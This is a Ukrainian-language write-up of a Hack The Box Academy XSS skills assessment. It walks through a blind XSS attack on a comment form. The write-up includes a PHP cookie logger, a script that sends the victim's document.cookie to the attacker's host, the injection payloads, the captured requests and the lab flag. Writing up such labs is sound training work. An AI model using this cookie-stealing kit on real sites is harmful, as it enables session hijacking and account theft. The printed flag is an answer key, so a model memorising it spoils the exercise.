## XSS — Skills Assessment: Session Hijacking (flag cookie)

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)
**Секція:** [Skills Assessment](https://academy.hackthebox.com/app/module/103/section/1011)
**Завдання:** Знайти значення cookie `flag`
**Прапор:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`

***

## Концепція

Blind XSS у формі коментарів — поле `Website` вставляється у HTML без санітизації. Admin переглядає реєстрації → виконується наш `script.js` → cookie відправляються на наш PHP listener.

***

## Крок 1 — Підготовка серверної директорії

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```

Створюємо `index.php` — cookie logger:

```bash
cat > /tmp/tmpserver/index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF
```

Створюємо `script.js` — cookie stealer:

```bash
cat > /tmp/tmpserver/script.js << 'EOF'
new Image().src='http://10.10.14.214/index.php?c='+document.cookie;
EOF
```

> **Важливо:** порт **80** (без `:8080`) — якщо `script.js` написаний з портом `8080` а сервер слухає на `80` — запит не прийде. Перевіряй збіг портів.

Запускаємо PHP сервер:

```bash
sudo php -S 0.0.0.0:80 -t /tmp/tmpserver/
```

Перевіряємо файли:

```bash
ls /tmp/tmpserver/
# index.php  script.js
```

***

## Крок 2 — Blind XSS Detection (знаходимо вразливе поле)

Відкриваємо `http://10.129.33.118/assessment/index.php` — форма з полями Comment, Name, Website, Email.

У кожне поле з іменем як шляхом:

```
Comment:  "><script src=http://10.10.14.214/Comment></script>
Name:     "><script src=http://10.10.14.214/Name></script>
Website:  "><script src=http://10.10.14.214/Website></script>
Email:    test@test.com
```

Відправляємо → чекаємо ~30 сек → дивимось PHP термінал:

```
10.129.33.118:55010 [200]: GET /website
```

**Вразливе поле: `Website`**

***

## Крок 3 — Відправка cookie-stealing payload

Заповнюємо форму знову (новий email):

```
Comment:  anything
Name:     anything
Website:  "><script src=http://10.10.14.214/script.js></script>
Email:    test2@test.com
```

***

## Крок 4 — Отримуємо cookie

У PHP терміналі бачимо два запити:

```
GET /script.js
GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1781683666;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

Читаємо з файлу:

```bash
cat /tmp/tmpserver/cookies.txt
# Victim IP: 10.129.33.118 | Cookie: flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

***

## Типові помилки та фікси

| Проблема | Причина | Фікс |
|---|---|---|
| Запит на `/website` є, а `/index.php?c=` немає | `script.js` містить неправильний порт | Перевір `cat /tmp/tmpserver/script.js` — порт має збігатись з PHP сервером |
| PHP сервер не отримує запитів взагалі | Сервер запущений не на tun0 IP або firewall | `sudo php -S 0.0.0.0:80` замість конкретного IP |
| `"><script>` не спрацьовує | Поле санітизує `"` | Спробувати `'><script src=...></script>` |

***

## Прапор

```
HTB{cr055_5173_5cr1p71n6_n1nj4}
```
